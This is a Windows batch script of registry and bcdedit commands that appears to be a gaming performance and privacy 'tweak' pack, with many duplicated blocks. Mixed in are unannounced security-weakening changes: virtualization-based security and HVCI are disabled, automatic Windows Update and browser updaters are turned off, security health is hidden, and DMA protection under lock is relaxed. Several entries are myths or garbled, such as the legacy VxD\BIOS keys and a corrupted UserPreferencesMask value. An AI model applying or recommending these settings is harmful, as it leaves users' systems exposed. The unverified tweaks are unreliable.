Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d "4" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDr" /v "Start" /t REG_DWORD /d "4" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\FTH" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\MicrosoftEdgeElevationService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\edgeupdate" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\edgeupdatem" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftEdgeUpdateTaskMachineCore" /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftEdgeUpdateTaskMachineUA" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "StartupBoostEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "BackgroundModeEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GoogleChromeElevationService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\gupdatem" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v "UseDpiScaling" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Multimedia\Audio" /v "UserDuckingPreference" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\BootAnimation" /v "DisableStartupSound" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ctfmon" /t REG_SZ /d "C:\Windows\System32\ctfmon.exe" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\VideoSettings" /v "VideoQualityOnBattery" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "UserPreferencesMask" /t REG_EXPAND_SZ /d "ነ考" /f
Reg.exe add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "AlwaysHibernateThumbnails" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "ShowedToastAtLevel" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKU\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v "DownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v "fAllowToGetHelp" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "StartupBoostEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "BackgroundModeEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SearchSettings" /v "IsDeviceSearchHistoryEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "autodisconnect" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "EnableOplocks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationRetries" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "AlwaysOn" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "FontSmoothing" /t REG_SZ /d "2" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "FontSmoothingType" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MultitaskingView\AllUpView" /v "AllUpView" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MultitaskingView\AllUpView" /v "Remove TaskView" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d "1" /f 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ExtendedUIHoverTime" /t REG_DWORD /d "196608" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DontPrettyPath" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d "1" /f 
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInstrumentation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\FVE" /v "DisableExternalDMAUnderLock" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f
bcdedit /set x2apicpolicy Enable
Reg.exe add "HKLM\SOFTWARE\Microsoft\FTH" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftEdgeUpdateTaskMachineCore" /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftEdgeUpdateTaskMachineUA" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "StartupBoostEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "BackgroundModeEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /v "UseDpiScaling" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Multimedia\Audio" /v "UserDuckingPreference" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\BootAnimation" /v "DisableStartupSound" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ctfmon" /t REG_SZ /d "C:\Windows\System32\ctfmon.exe" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\VideoSettings" /v "VideoQualityOnBattery" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKU\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v "DownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v "NoLockScreen" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v "NoLockScreenCamera" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FortniteClient-Win64-Shipping.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
